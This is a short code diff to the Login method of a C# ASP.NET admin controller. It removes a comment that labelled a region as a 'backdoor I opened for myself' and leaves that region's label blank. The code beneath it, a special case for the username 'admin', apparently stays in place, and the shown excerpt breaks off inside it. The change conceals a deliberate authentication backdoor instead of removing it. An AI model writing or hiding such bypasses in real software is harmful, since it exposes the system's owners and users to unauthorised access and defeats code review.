@@ -19,12 +19,9 @@ namespace App.Admin.Controllers
             return View();
         }
 
-        /// <summary>
-        /// 登陆
-        /// </summary>
         public ActionResult Login(string UserName, string Password, string Code)
         {
-            #region 给自己开的后门
+            #region 
             if (UserName == "admin")
             {
                 var account11 = new AccountModel();
